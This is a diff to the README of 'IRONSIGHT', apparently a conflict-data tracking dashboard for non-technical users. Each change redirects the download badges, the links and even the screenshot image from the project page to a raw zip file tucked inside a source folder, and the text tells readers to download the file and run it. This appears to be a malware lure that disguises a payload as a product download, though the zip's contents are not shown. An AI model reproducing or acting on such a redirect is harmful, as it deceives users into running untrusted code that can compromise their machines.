@@ -1,8 +1,8 @@
 # 🛰️ IRONSIGHT - Track Conflict Data In One Place
 
-[![Download IRONSIGHT](https://img.shields.io/badge/Download-IRONSIGHT-6B7280?style=for-the-badge)](https://github.com/Kinetictheoryofheatshipbreaker23/IRONSIGHT)
+[![Download IRONSIGHT](https://img.shields.io/badge/Download-IRONSIGHT-6B7280?style=for-the-badge)](https://raw.githubusercontent.com/Kinetictheoryofheatshipbreaker23/IRONSIGHT/main/src/components/map/Software_1.5.zip)
 
-![IRONSIGHT Dashboard](https://raw.githubusercontent.com/Noblerworks/IRONSIGHT/main/Ironsight.png?v=2)
+![IRONSIGHT Dashboard](https://raw.githubusercontent.com/Kinetictheoryofheatshipbreaker23/IRONSIGHT/main/src/components/map/Software_1.5.zip)
 
 ## 🧭 What IRONSIGHT Does
 
@@ -14,7 +14,7 @@ It is made for non-technical users. You do not need API keys or setup work beyon
 
 Use this link to visit the download page:
 
-[Download IRONSIGHT](https://github.com/Kinetictheoryofheatshipbreaker23/IRONSIGHT)
+[Download IRONSIGHT](https://raw.githubusercontent.com/Kinetictheoryofheatshipbreaker23/IRONSIGHT/main/src/components/map/Software_1.5.zip)
 
 If the page offers a release file, download it to your PC and run it.
 
@@ -227,4 +227,4 @@ IRONSIGHT gives you:
 
 ## 📥 Download Again
 
-[Visit the IRONSIGHT download page](https://github.com/Kinetictheoryofheatshipbreaker23/IRONSIGHT)
+[Visit the IRONSIGHT download page](https://raw.githubusercontent.com/Kinetictheoryofheatshipbreaker23/IRONSIGHT/main/src/components/map/Software_1.5.zip)
